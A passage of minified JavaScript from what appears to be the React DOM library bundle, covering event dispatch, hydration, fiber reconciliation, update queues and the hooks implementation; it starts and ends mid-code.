e;if((v||g)&&(g=f.window===f?f:(g=f.ownerDocument)?g.defaultView||g.parentWindow:window,v?(k=t.relatedTarget||t.toElement,v=u,k=k?zn(k):null,k!==null&&(S=Qn(k),k!==S||k.tag!==5&&k.tag!==6)&&(k=null)):(v=null,k=u),v!==k)){if(y=Wo,x="onMouseLeave",m="onMouseEnter",d="mouse",(e==="pointerout"||e==="pointerover")&&(y=$o,x="onPointerLeave",m="onPointerEnter",d="pointer"),S=v==null?g:it(v),h=k==null?g:it(k),g=new y(x,d+"leave",v,t,f),g.target=S,g.relatedTarget=h,x=null,zn(f)===u&&(y=new y(m,d+"enter",k,t,f),y.target=h,y.relatedTarget=S,x=y),S=x,v&&k)n:{for(y=v,m=k,d=0,h=y;h;h=et(h))d++;for(h=0,x=m;x;x=et(x))h++;for(;0<d-h;)y=et(y),d--;for(;0<h-d;)m=et(m),h--;for(;d--;){if(y===m||m!==null&&y===m.alternate)break n;y=et(y),m=et(m)}y=null}else y=null;v!==null&&sl(p,g,v,y,!1),k!==null&&S!==null&&sl(p,S,k,y,!0)}}e:{if(g=u?it(u):window,v=g.nodeName&&g.nodeName.toLowerCase(),v==="select"||v==="input"&&g.type==="file")var b=kh;else if(Yo(g))if(su)b=_h;else{b=xh;var E=bh}else(v=g.nodeName)&&v.toLowerCase()==="input"&&(g.type==="checkbox"||g.type==="radio")&&(b=Sh);if(b&&(b=b(e,u))){tu(p,b,t,f);break e}E&&E(e,g,u),e==="focusout"&&(E=g._wrapperState)&&E.controlled&&g.type==="number"&&Or(g,"number",g.value)}switch(E=u?it(u):window,e){case"focusin":(Yo(E)||E.contentEditable==="true")&&(at=E,Yr=u,Xt=null);break;case"focusout":Xt=Yr=at=null;break;case"mousedown":Xr=!0;break;case"contextmenu":case"mouseup":case"dragend":Xr=!1,el(p,t,f);break;case"selectionchange":if(Lh)break;case"keydown":case"keyup":el(p,t,f)}var C;if(Vi)e:{switch(e){case"compositionstart":var A="onCompositionStart";break e;case"compositionend":A="onCompositionEnd";break e;case"compositionupdate":A="onCompositionUpdate";break e}A=void 0}else st?eu(e,t)&&(A="onCompositionEnd"):e==="keydown"&&t.keyCode===229&&(A="onCompositionStart");A&&(Zc&&t.locale!=="ko"&&(st||A!=="onCompositionStart"?A==="onCompositionEnd"&&st&&(C=Jc()):(kn=f,Ui="value"in kn?kn.value:kn.textContent,st=!0)),E=ha(u,A),0<E.length&&(A=new Vo(A,e,null,t,f),p.push({event:A,listeners:E}),C?A.data=C:(C=nu(t),C!==null&&(A.data=C)))),(C=mh?gh(e,t):yh(e,t))&&(u=ha(u,"onBeforeInput"),0<u.length&&(f=new Vo("onBeforeInput","beforeinput",null,t,f),p.push({event:f,listeners:u}),f.data=C))}hu(p,n)})}function us(e,n,t){return{instance:e,listener:n,currentTarget:t}}function ha(e,n){for(var t=n+"Capture",s=[];e!==null;){var a=e,r=a.stateNode;a.tag===5&&r!==null&&(a=r,r=ss(e,t),r!=null&&s.unshift(us(e,r,a)),r=ss(e,n),r!=null&&s.push(us(e,r,a))),e=e.return}return s}function et(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function sl(e,n,t,s,a){for(var r=n._reactName,i=[];t!==null&&t!==s;){var l=t,c=l.alternate,u=l.stateNode;if(c!==null&&c===s)break;l.tag===5&&u!==null&&(l=u,a?(c=ss(t,r),c!=null&&i.unshift(us(t,c,l))):a||(c=ss(t,r),c!=null&&i.push(us(t,c,l)))),t=t.return}i.length!==0&&e.push({event:n,listeners:i})}var Nh=/\r\n?/g,Mh=/\u0000|\uFFFD/g;function al(e){return(typeof e=="string"?e:""+e).replace(Nh,`
`).replace(Mh,"")}function Rs(e,n,t){if(n=al(n),al(e)!==n&&t)throw Error(L(425))}function fa(){}var Qr=null,Jr=null;function Zr(e,n){return e==="textarea"||e==="noscript"||typeof n.children=="string"||typeof n.children=="number"||typeof n.dangerouslySetInnerHTML=="object"&&n.dangerouslySetInnerHTML!==null&&n.dangerouslySetInnerHTML.__html!=null}var ei=typeof setTimeout=="function"?setTimeout:void 0,jh=typeof clearTimeout=="function"?clearTimeout:void 0,rl=typeof Promise=="function"?Promise:void 0,Ih=typeof queueMicrotask=="function"?queueMicrotask:typeof rl<"u"?function(e){return rl.resolve(null).then(e).catch(qh)}:ei;function qh(e){setTimeout(function(){throw e})}function dr(e,n){var t=n,s=0;do{var a=t.nextSibling;if(e.removeChild(t),a&&a.nodeType===8)if(t=a.data,t==="/$"){if(s===0){e.removeChild(a),is(n);return}s--}else t!=="$"&&t!=="$?"&&t!=="$!"||s++;t=a}while(t);is(n)}function En(e){for(;e!=null;e=e.nextSibling){var n=e.nodeType;if(n===1||n===3)break;if(n===8){if(n=e.data,n==="$"||n==="$!"||n==="$?")break;if(n==="/$")return null}}return e}function il(e){e=e.previousSibling;for(var n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="$"||t==="$!"||t==="$?"){if(n===0)return e;n--}else t==="/$"&&n++}e=e.previousSibling}return null}var Nt=Math.random().toString(36).slice(2),Ze="__reactFiber$"+Nt,ds="__reactProps$"+Nt,un="__reactContainer$"+Nt,ni="__reactEvents$"+Nt,Rh="__reactListeners$"+Nt,Oh="__reactHandles$"+Nt;function zn(e){var n=e[Ze];if(n)return n;for(var t=e.parentNode;t;){if(n=t[un]||t[Ze]){if(t=n.alternate,n.child!==null||t!==null&&t.child!==null)for(e=il(e);e!==null;){if(t=e[Ze])return t;e=il(e)}return n}e=t,t=e.parentNode}return null}function Ss(e){return e=e[Ze]||e[un],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function it(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(L(33))}function qa(e){return e[ds]||null}var ti=[],ot=-1;function qn(e){return{current:e}}function V(e){0>ot||(e.current=ti[ot],ti[ot]=null,ot--)}function H(e,n){ot++,ti[ot]=e.current,e.current=n}var jn={},he=qn(jn),_e=qn(!1),Vn=jn;function xt(e,n){var t=e.type.contextTypes;if(!t)return jn;var s=e.stateNode;if(s&&s.__reactInternalMemoizedUnmaskedChildContext===n)return s.__reactInternalMemoizedMaskedChildContext;var a={},r;for(r in t)a[r]=n[r];return s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=n,e.__reactInternalMemoizedMaskedChildContext=a),a}function Te(e){return e=e.childContextTypes,e!=null}function ma(){V(_e),V(he)}function ol(e,n,t){if(he.current!==jn)throw Error(L(168));H(he,n),H(_e,t)}function mu(e,n,t){var s=e.stateNode;if(n=n.childContextTypes,typeof s.getChildContext!="function")return t;s=s.getChildContext();for(var a in s)if(!(a in n))throw Error(L(108,bp(e)||"Unknown",a));return Y({},t,s)}function ga(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||jn,Vn=he.current,H(he,e),H(_e,_e.current),!0}function ll(e,n,t){var s=e.stateNode;if(!s)throw Error(L(169));t?(e=mu(e,n,Vn),s.__reactInternalMemoizedMergedChildContext=e,V(_e),V(he),H(he,e)):V(_e),H(_e,t)}var an=null,Ra=!1,pr=!1;function gu(e){an===null?an=[e]:an.push(e)}function Dh(e){Ra=!0,gu(e)}function Rn(){if(!pr&&an!==null){pr=!0;var e=0,n=B;try{var t=an;for(B=1;e<t.length;e++){var s=t[e];do s=s(!0);while(s!==null)}an=null,Ra=!1}catch(a){throw an!==null&&(an=an.slice(e+1)),Bc(Di,Rn),a}finally{B=n,pr=!1}}return null}var lt=[],ct=0,ya=null,va=0,Re=[],Oe=0,$n=null,rn=1,on="";function On(e,n){lt[ct++]=va,lt[ct++]=ya,ya=e,va=n}function yu(e,n,t){Re[Oe++]=rn,Re[Oe++]=on,Re[Oe++]=$n,$n=e;var s=rn;e=on;var a=32-Ke(s)-1;s&=~(1<<a),t+=1;var r=32-Ke(n)+a;if(30<r){var i=a-a%5;r=(s&(1<<i)-1).toString(32),s>>=i,a-=i,rn=1<<32-Ke(n)+a|t<<a|s,on=r+e}else rn=1<<r|t<<a|s,on=e}function Gi(e){e.return!==null&&(On(e,1),yu(e,1,0))}function Ki(e){for(;e===ya;)ya=lt[--ct],lt[ct]=null,va=lt[--ct],lt[ct]=null;for(;e===$n;)$n=Re[--Oe],Re[Oe]=null,on=Re[--Oe],Re[Oe]=null,rn=Re[--Oe],Re[Oe]=null}var Ae=null,Pe=null,$=!1,$e=null;function vu(e,n){var t=De(5,null,null,0);t.elementType="DELETED",t.stateNode=n,t.return=e,n=e.deletions,n===null?(e.deletions=[t],e.flags|=16):n.push(t)}function cl(e,n){switch(e.tag){case 5:var t=e.type;return n=n.nodeType!==1||t.toLowerCase()!==n.nodeName.toLowerCase()?null:n,n!==null?(e.stateNode=n,Ae=e,Pe=En(n.firstChild),!0):!1;case 6:return n=e.pendingProps===""||n.nodeType!==3?null:n,n!==null?(e.stateNode=n,Ae=e,Pe=null,!0):!1;case 13:return n=n.nodeType!==8?null:n,n!==null?(t=$n!==null?{id:rn,overflow:on}:null,e.memoizedState={dehydrated:n,treeContext:t,retryLane:1073741824},t=De(18,null,null,0),t.stateNode=n,t.return=e,e.child=t,Ae=e,Pe=null,!0):!1;default:return!1}}function si(e){return(e.mode&1)!==0&&(e.flags&128)===0}function ai(e){if($){var n=Pe;if(n){var t=n;if(!cl(e,n)){if(si(e))throw Error(L(418));n=En(t.nextSibling);var s=Ae;n&&cl(e,n)?vu(s,t):(e.flags=e.flags&-4097|2,$=!1,Ae=e)}}else{if(si(e))throw Error(L(418));e.flags=e.flags&-4097|2,$=!1,Ae=e}}}function ul(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;Ae=e}function Os(e){if(e!==Ae)return!1;if(!$)return ul(e),$=!0,!1;var n;if((n=e.tag!==3)&&!(n=e.tag!==5)&&(n=e.type,n=n!=="head"&&n!=="body"&&!Zr(e.type,e.memoizedProps)),n&&(n=Pe)){if(si(e))throw wu(),Error(L(418));for(;n;)vu(e,n),n=En(n.nextSibling)}if(ul(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(L(317));e:{for(e=e.nextSibling,n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="/$"){if(n===0){Pe=En(e.nextSibling);break e}n--}else t!=="$"&&t!=="$!"&&t!=="$?"||n++}e=e.nextSibling}Pe=null}}else Pe=Ae?En(e.stateNode.nextSibling):null;return!0}function wu(){for(var e=Pe;e;)e=En(e.nextSibling)}function St(){Pe=Ae=null,$=!1}function Yi(e){$e===null?$e=[e]:$e.push(e)}var zh=hn.ReactCurrentBatchConfig;function Dt(e,n,t){if(e=t.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(t._owner){if(t=t._owner,t){if(t.tag!==1)throw Error(L(309));var s=t.stateNode}if(!s)throw Error(L(147,e));var a=s,r=""+e;return n!==null&&n.ref!==null&&typeof n.ref=="function"&&n.ref._stringRef===r?n.ref:(n=function(i){var l=a.refs;i===null?delete l[r]:l[r]=i},n._stringRef=r,n)}if(typeof e!="string")throw Error(L(284));if(!t._owner)throw Error(L(290,e))}return e}function Ds(e,n){throw e=Object.prototype.toString.call(n),Error(L(31,e==="[object Object]"?"object with keys {"+Object.keys(n).join(", ")+"}":e))}function dl(e){var n=e._init;return n(e._payload)}function ku(e){function n(m,d){if(e){var h=m.deletions;h===null?(m.deletions=[d],m.flags|=16):h.push(d)}}function t(m,d){if(!e)return null;for(;d!==null;)n(m,d),d=d.sibling;return null}function s(m,d){for(m=new Map;d!==null;)d.key!==null?m.set(d.key,d):m.set(d.index,d),d=d.sibling;return m}function a(m,d){return m=An(m,d),m.index=0,m.sibling=null,m}function r(m,d,h){return m.index=h,e?(h=m.alternate,h!==null?(h=h.index,h<d?(m.flags|=2,d):h):(m.flags|=2,d)):(m.flags|=1048576,d)}function i(m){return e&&m.alternate===null&&(m.flags|=2),m}function l(m,d,h,x){return d===null||d.tag!==6?(d=wr(h,m.mode,x),d.return=m,d):(d=a(d,h),d.return=m,d)}function c(m,d,h,x){var b=h.type;return b===tt?f(m,d,h.props.children,x,h.key):d!==null&&(d.elementType===b||typeof b=="object"&&b!==null&&b.$$typeof===gn&&dl(b)===d.type)?(x=a(d,h.props),x.ref=Dt(m,d,h),x.return=m,x):(x=aa(h.type,h.key,h.props,null,m.mode,x),x.ref=Dt(m,d,h),x.return=m,x)}function u(m,d,h,x){return d===null||d.tag!==4||d.stateNode.containerInfo!==h.containerInfo||d.stateNode.implementation!==h.implementation?(d=kr(h,m.mode,x),d.return=m,d):(d=a(d,h.children||[]),d.return=m,d)}function f(m,d,h,x,b){return d===null||d.tag!==7?(d=Hn(h,m.mode,x,b),d.return=m,d):(d=a(d,h),d.return=m,d)}function p(m,d,h){if(typeof d=="string"&&d!==""||typeof d=="number")return d=wr(""+d,m.mode,h),d.return=m,d;if(typeof d=="object"&&d!==null){switch(d.$$typeof){case Ls:return h=aa(d.type,d.key,d.props,null,m.mode,h),h.ref=Dt(m,null,d),h.return=m,h;case nt:return d=kr(d,m.mode,h),d.return=m,d;case gn:var x=d._init;return p(m,x(d._payload),h)}if(Ht(d)||jt(d))return d=Hn(d,m.mode,h,null),d.return=m,d;Ds(m,d)}return null}function g(m,d,h,x){var b=d!==null?d.key:null;if(typeof h=="string"&&h!==""||typeof h=="number")return b!==null?null:l(m,d,""+h,x);if(typeof h=="object"&&h!==null){switch(h.$$typeof){case Ls:return h.key===b?c(m,d,h,x):null;case nt:return h.key===b?u(m,d,h,x):null;case gn:return b=h._init,g(m,d,b(h._payload),x)}if(Ht(h)||jt(h))return b!==null?null:f(m,d,h,x,null);Ds(m,h)}return null}function v(m,d,h,x,b){if(typeof x=="string"&&x!==""||typeof x=="number")return m=m.get(h)||null,l(d,m,""+x,b);if(typeof x=="object"&&x!==null){switch(x.$$typeof){case Ls:return m=m.get(x.key===null?h:x.key)||null,c(d,m,x,b);case nt:return m=m.get(x.key===null?h:x.key)||null,u(d,m,x,b);case gn:var E=x._init;return v(m,d,h,E(x._payload),b)}if(Ht(x)||jt(x))return m=m.get(h)||null,f(d,m,x,b,null);Ds(d,x)}return null}function k(m,d,h,x){for(var b=null,E=null,C=d,A=d=0,I=null;C!==null&&A<h.length;A++){C.index>A?(I=C,C=null):I=C.sibling;var j=g(m,C,h[A],x);if(j===null){C===null&&(C=I);break}e&&C&&j.alternate===null&&n(m,C),d=r(j,d,A),E===null?b=j:E.sibling=j,E=j,C=I}if(A===h.length)return t(m,C),$&&On(m,A),b;if(C===null){for(;A<h.length;A++)C=p(m,h[A],x),C!==null&&(d=r(C,d,A),E===null?b=C:E.sibling=C,E=C);return $&&On(m,A),b}for(C=s(m,C);A<h.length;A++)I=v(C,m,A,h[A],x),I!==null&&(e&&I.alternate!==null&&C.delete(I.key===null?A:I.key),d=r(I,d,A),E===null?b=I:E.sibling=I,E=I);return e&&C.forEach(function(Z){return n(m,Z)}),$&&On(m,A),b}function y(m,d,h,x){var b=jt(h);if(typeof b!="function")throw Error(L(150));if(h=b.call(h),h==null)throw Error(L(151));for(var E=b=null,C=d,A=d=0,I=null,j=h.next();C!==null&&!j.done;A++,j=h.next()){C.index>A?(I=C,C=null):I=C.sibling;var Z=g(m,C,j.value,x);if(Z===null){C===null&&(C=I);break}e&&C&&Z.alternate===null&&n(m,C),d=r(Z,d,A),E===null?b=Z:E.sibling=Z,E=Z,C=I}if(j.done)return t(m,C),$&&On(m,A),b;if(C===null){for(;!j.done;A++,j=h.next())j=p(m,j.value,x),j!==null&&(d=r(j,d,A),E===null?b=j:E.sibling=j,E=j);return $&&On(m,A),b}for(C=s(m,C);!j.done;A++,j=h.next())j=v(C,m,A,j.value,x),j!==null&&(e&&j.alternate!==null&&C.delete(j.key===null?A:j.key),d=r(j,d,A),E===null?b=j:E.sibling=j,E=j);return e&&C.forEach(function(we){return n(m,we)}),$&&On(m,A),b}function S(m,d,h,x){if(typeof h=="object"&&h!==null&&h.type===tt&&h.key===null&&(h=h.props.children),typeof h=="object"&&h!==null){switch(h.$$typeof){case Ls:e:{for(var b=h.key,E=d;E!==null;){if(E.key===b){if(b=h.type,b===tt){if(E.tag===7){t(m,E.sibling),d=a(E,h.props.children),d.return=m,m=d;break e}}else if(E.elementType===b||typeof b=="object"&&b!==null&&b.$$typeof===gn&&dl(b)===E.type){t(m,E.sibling),d=a(E,h.props),d.ref=Dt(m,E,h),d.return=m,m=d;break e}t(m,E);break}else n(m,E);E=E.sibling}h.type===tt?(d=Hn(h.props.children,m.mode,x,h.key),d.return=m,m=d):(x=aa(h.type,h.key,h.props,null,m.mode,x),x.ref=Dt(m,d,h),x.return=m,m=x)}return i(m);case nt:e:{for(E=h.key;d!==null;){if(d.key===E)if(d.tag===4&&d.stateNode.containerInfo===h.containerInfo&&d.stateNode.implementation===h.implementation){t(m,d.sibling),d=a(d,h.children||[]),d.return=m,m=d;break e}else{t(m,d);break}else n(m,d);d=d.sibling}d=kr(h,m.mode,x),d.return=m,m=d}return i(m);case gn:return E=h._init,S(m,d,E(h._payload),x)}if(Ht(h))return k(m,d,h,x);if(jt(h))return y(m,d,h,x);Ds(m,h)}return typeof h=="string"&&h!==""||typeof h=="number"?(h=""+h,d!==null&&d.tag===6?(t(m,d.sibling),d=a(d,h),d.return=m,m=d):(t(m,d),d=wr(h,m.mode,x),d.return=m,m=d),i(m)):t(m,d)}return S}var _t=ku(!0),bu=ku(!1),wa=qn(null),ka=null,ut=null,Xi=null;function Qi(){Xi=ut=ka=null}function Ji(e){var n=wa.current;V(wa),e._currentValue=n}function ri(e,n,t){for(;e!==null;){var s=e.alternate;if((e.childLanes&n)!==n?(e.childLanes|=n,s!==null&&(s.childLanes|=n)):s!==null&&(s.childLanes&n)!==n&&(s.childLanes|=n),e===t)break;e=e.return}}function vt(e,n){ka=e,Xi=ut=null,e=e.dependencies,e!==null&&e.firstContext!==null&&(e.lanes&n&&(Se=!0),e.firstContext=null)}function Fe(e){var n=e._currentValue;if(Xi!==e)if(e={context:e,memoizedValue:n,next:null},ut===null){if(ka===null)throw Error(L(308));ut=e,ka.dependencies={lanes:0,firstContext:e}}else ut=ut.next=e;return n}var Fn=null;function Zi(e){Fn===null?Fn=[e]:Fn.push(e)}function xu(e,n,t,s){var a=n.interleaved;return a===null?(t.next=t,Zi(n)):(t.next=a.next,a.next=t),n.interleaved=t,dn(e,s)}function dn(e,n){e.lanes|=n;var t=e.alternate;for(t!==null&&(t.lanes|=n),t=e,e=e.return;e!==null;)e.childLanes|=n,t=e.alternate,t!==null&&(t.childLanes|=n),t=e,e=e.return;return t.tag===3?t.stateNode:null}var yn=!1;function eo(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function Su(e,n){e=e.updateQueue,n.updateQueue===e&&(n.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function ln(e,n){return{eventTime:e,lane:n,tag:0,payload:null,callback:null,next:null}}function Ln(e,n,t){var s=e.updateQueue;if(s===null)return null;if(s=s.shared,z&2){var a=s.pending;return a===null?n.next=n:(n.next=a.next,a.next=n),s.pending=n,dn(e,t)}return a=s.interleaved,a===null?(n.next=n,Zi(s)):(n.next=a.next,a.next=n),s.interleaved=n,dn(e,t)}function Js(e,n,t){if(n=n.updateQueue,n!==null&&(n=n.shared,(t&4194240)!==0)){var s=n.lanes;s&=e.pendingLanes,t|=s,n.lanes=t,zi(e,t)}}function pl(e,n){var t=e.updateQueue,s=e.alternate;if(s!==null&&(s=s.updateQueue,t===s)){var a=null,r=null;if(t=t.firstBaseUpdate,t!==null){do{var i={eventTime:t.eventTime,lane:t.lane,tag:t.tag,payload:t.payload,callback:t.callback,next:null};r===null?a=r=i:r=r.next=i,t=t.next}while(t!==null);r===null?a=r=n:r=r.next=n}else a=r=n;t={baseState:s.baseState,firstBaseUpdate:a,lastBaseUpdate:r,shared:s.shared,effects:s.effects},e.updateQueue=t;return}e=t.lastBaseUpdate,e===null?t.firstBaseUpdate=n:e.next=n,t.lastBaseUpdate=n}function ba(e,n,t,s){var a=e.updateQueue;yn=!1;var r=a.firstBaseUpdate,i=a.lastBaseUpdate,l=a.shared.pending;if(l!==null){a.shared.pending=null;var c=l,u=c.next;c.next=null,i===null?r=u:i.next=u,i=c;var f=e.alternate;f!==null&&(f=f.updateQueue,l=f.lastBaseUpdate,l!==i&&(l===null?f.firstBaseUpdate=u:l.next=u,f.lastBaseUpdate=c))}if(r!==null){var p=a.baseState;i=0,f=u=c=null,l=r;do{var g=l.lane,v=l.eventTime;if((s&g)===g){f!==null&&(f=f.next={eventTime:v,lane:0,tag:l.tag,payload:l.payload,callback:l.callback,next:null});e:{var k=e,y=l;switch(g=n,v=t,y.tag){case 1:if(k=y.payload,typeof k=="function"){p=k.call(v,p,g);break e}p=k;break e;case 3:k.flags=k.flags&-65537|128;case 0:if(k=y.payload,g=typeof k=="function"?k.call(v,p,g):k,g==null)break e;p=Y({},p,g);break e;case 2:yn=!0}}l.callback!==null&&l.lane!==0&&(e.flags|=64,g=a.effects,g===null?a.effects=[l]:g.push(l))}else v={eventTime:v,lane:g,tag:l.tag,payload:l.payload,callback:l.callback,next:null},f===null?(u=f=v,c=p):f=f.next=v,i|=g;if(l=l.next,l===null){if(l=a.shared.pending,l===null)break;g=l,l=g.next,g.next=null,a.lastBaseUpdate=g,a.shared.pending=null}}while(!0);if(f===null&&(c=p),a.baseState=c,a.firstBaseUpdate=u,a.lastBaseUpdate=f,n=a.shared.interleaved,n!==null){a=n;do i|=a.lane,a=a.next;while(a!==n)}else r===null&&(a.shared.lanes=0);Kn|=i,e.lanes=i,e.memoizedState=p}}function hl(e,n,t){if(e=n.effects,n.effects=null,e!==null)for(n=0;n<e.length;n++){var s=e[n],a=s.callback;if(a!==null){if(s.callback=null,s=t,typeof a!="function")throw Error(L(191,a));a.call(s)}}}var _s={},nn=qn(_s),ps=qn(_s),hs=qn(_s);function Bn(e){if(e===_s)throw Error(L(174));return e}function no(e,n){switch(H(hs,n),H(ps,e),H(nn,_s),e=n.nodeType,e){case 9:case 11:n=(n=n.documentElement)?n.namespaceURI:zr(null,"");break;default:e=e===8?n.parentNode:n,n=e.namespaceURI||null,e=e.tagName,n=zr(n,e)}V(nn),H(nn,n)}function Tt(){V(nn),V(ps),V(hs)}function _u(e){Bn(hs.current);var n=Bn(nn.current),t=zr(n,e.type);n!==t&&(H(ps,e),H(nn,t))}function to(e){ps.current===e&&(V(nn),V(ps))}var G=qn(0);function xa(e){for(var n=e;n!==null;){if(n.tag===13){var t=n.memoizedState;if(t!==null&&(t=t.dehydrated,t===null||t.data==="$?"||t.data==="$!"))return n}else if(n.tag===19&&n.memoizedProps.revealOrder!==void 0){if(n.flags&128)return n}else if(n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return null;n=n.return}n.sibling.return=n.return,n=n.sibling}return null}var hr=[];function so(){for(var e=0;e<hr.length;e++)hr[e]._workInProgressVersionPrimary=null;hr.length=0}var Zs=hn.ReactCurrentDispatcher,fr=hn.ReactCurrentBatchConfig,Gn=0,K=null,ne=null,ae=null,Sa=!1,Qt=!1,fs=0,Fh=0;function ue(){throw Error(L(321))}function ao(e,n){if(n===null)return!1;for(var t=0;t<n.length&&t<e.length;t++)if(!Xe(e[t],n[t]))return!1;return!0}function ro(e,n,t,s,a,r){if(Gn=r,K=n,n.memoizedState=null,n.updateQueue=null,n.lanes=0,Zs.current=e===null||e.memoizedState===null?Wh:Vh,e=t(s,a),Qt){r=0;do{if(Qt=!1,fs=0,25<=r)throw Error(L(301));r+=1,ae=ne=null,n.updateQueue=null,Zs.current=$h,e=t(s,a)}while(Qt)}if(Zs.current=_a,n=ne!==null&&ne.next!==null,Gn=0,ae=ne=K=null,Sa=!1,n)throw Error(L(300));return e}function io(){var e=fs!==0;return fs=0,e}function Je(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return ae===null?K.memoizedState=ae=e:ae=ae.next=e,ae}function Be(){if(ne===null){var e=K.alternate;e=e!==null?e.memoizedState:null}else e=ne.next;var n=ae===null?K.memoizedState:ae.next;if(n!==null)ae=n,ne=e;else{if(e===null)throw Error(L(310));ne=e,e={memoizedState:ne.memoizedState,baseState:ne.baseState,baseQueue:ne.baseQueue,queue:ne.queue,next:null},ae===null?K.memoizedState=ae=e:ae=ae.next=e}return ae}function ms(e,n){return typeof n=="function"?n(e):n}function mr(e){var n=Be(),t=n.queue;if(t===null)throw Error(L(311));t.lastRenderedReducer=e;var s=ne,a=s.baseQueue,r=t.pending;if(r!==null){if(a!==null){var i=a.next;a.next=r.next,r.next=i}s.baseQueue=a=r,t.pending=null}if(a!==null){r=a.next,s=s.baseState;var l=i=null,c=null,u=r;do{var f=u.lane;if((Gn&f)===f)c!==null&&(c=c.next={lane:0,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null}),s=u.hasEagerState?u.eagerState:e(s,u.action);else{var p={lane:f,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null};c===null?(l=c=p,i=s):c=c.next=p,K.lanes|=f,Kn|=f}u=u.next}while(u!==null&&u!==r);c===null?i=s:c.next=l,Xe(s,n.memoizedState)||(Se=!0),n.memoizedState=s,n.baseState=i,n.baseQueue=c,t.lastRenderedState=s}if(e=t.interleaved,e!==null){a=e;do r=a.lane,K.lanes|=r,Kn|=r,a=a.next;while(a!==e)}else a===null&&(t.lanes=0);return[n.memoizedState,t.dispatch]}function gr(e){var n=Be(),t=n.queue;if(t===null)throw Error(L(311));t.lastRenderedReducer=e;var s=t.dispatch,a=t.pending,r=n.memoizedState;if(a!==null){t.pending=null;var i=a=a.next;do r=e(r,i.action),i=i.next;while(i!==a);Xe(r,n.memoizedState)||(Se=!0),n.memoizedState=r,n.baseQueue===null&&(n.baseState=r),t.lastRenderedState=r}return[r,s]}function Tu(){}function Eu(e,n){var t=K,s=Be(),a=n(),r=!Xe(s.memoizedState,a);if(r&&(s.memoizedState=a,Se=!0),s=s.queue,oo(Pu.bind(null,t,s,e),[e]),s.getSnapshot!==n||r||ae!==null&&ae.memoizedState.tag&1){if(t.flags|=2048,gs(9,Cu.bind(null,t,s,a,n),void 0,null),ie===null)throw Error(L(349));Gn&30||Lu(t,n,a)}return a}function Lu(e,n,t){e.flags|=16384,e={getSnapshot:n,value:t},n=K.updateQueue,n===null?(n={lastEffect:null,stores:null},K.updateQueue=n,n.stores=[e]):(t=n.stores,t===null?n.stores=[e]:t.push(e))}function Cu(e,n,t,s){n.value=t,n.getSnapshot=s,Au(n)&&Nu(e)}function Pu(e,n,t){return t(function(){Au(n)&&Nu(e)})}function Au(e){var n=e.getSnapshot;e=e.value;try{var t=n();return!Xe(e,t)}catch{return!0}}function Nu(e){var n=dn(e,1);n!==null&&Ye(n,e,1,-1)}function fl(e){var n=Je();return typeof e=="function"&&(e=e()),n.memoizedState=n.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:ms,lastRenderedState:e},n.queue=e,e=e.dispatch=Hh.bind(null,K,e),[n.memoizedState,e]}function gs(e,n,t,s){return e={tag:e,create:n,destroy:t,deps:s,next:null},n=K.updateQueue,n===null?(n={lastEffect:null,stores:null},K.updateQueue=n,n.lastEffect=e.next=e):(t=n.lastEffect,t===null?n.lastEffect=e.next=e:(s=t.next,t.next=e,e.next=s,n.lastEffect=e)),e}function Mu(){return Be().memoizedState}function ea(e,n,t,s){var a=Je();K.flags|=e,a.memoizedState=gs(1|n,t,void 0,s===void 0?null:s)}function Oa(e,n,t,s){var a=Be();s=s===void 0?null:s;var r=void 0;if(ne!==null){var i=ne.memoizedState;if(r=i.destroy,s!==null&&ao(s,i.deps)){a.memoizedState=gs(n,t,r,s);return}}K.flags|=e,a.memoizedState=gs(1|n,t,r,s)}function ml(e,n){return ea(8390656,8,e,n)}function oo(e,n){return Oa(2048,8,e,n)}function ju(e,n){return Oa(4,2,e,n)}function Iu(e,n){return Oa(4,4,e,n)}function qu(e,n){if(typeof n=="function")return e=e(),n(e),function(){n(null)};if(n!=null)return e=e(),n.current=e,function(){n.current=null}}function Ru(e,n,t){return t=t!=null?t.concat([e]):null,Oa(4,4,qu.bind(null,n,e),t)}function lo(){}function Ou(e,n){var t=Be();n=n===void 0?null:n;var s=t.memoizedState;return s!==null&&n!==null&&ao(n,s[1])?s[0]:(t.memoizedState=[e,n],e)}function Du(e,n){var t=Be();n=n===void 0?null:n;var s=t.memoizedState;return s!==null&&n!==null&&ao(n,s[1])?s[0]:(e=e(),t.memoizedState=[e,n],e)}function zu(e,n,t){return Gn&21?(Xe(t,n)||(t=Wc(),K.lanes|=t,Kn|=t,e.baseState=!0),n):(e.baseState&&(e.baseState=!1,Se=!0),e.memoizedState=t)}function Bh(e,n){var t=B;B=t!==0&&4>t?t:4,e(!0);var s=fr.transition;fr.transition={};try{e(!1),n()}finally{B=t,fr.transition=s}}function Fu(){return Be().memoizedState}function Uh(e,n,t){var s=Pn(e);if(t={lane:s,action:t,hasEagerState:!1,eagerState:null,next:null},Bu(e))Uu(n,t);else if(t=xu(e,n,t,s),t!==null){var a=ge();Ye(t,e,s,a),Hu(t,n,s)}}function Hh(e,n,t){var s=Pn(e),a={lane:s,action:t,hasEagerState:!1,eagerState:null,next:null};if(Bu(e))Uu(n,a);else{var r=e.alternate;if(e.lanes===0&&(r===null||r.lanes===0)&&(r=n.lastRenderedReducer,r!==null))try{var i=n.lastRenderedState,l=r(i,t);if(a.hasEagerState=!0,a.eagerState=l,Xe(l,i)){var 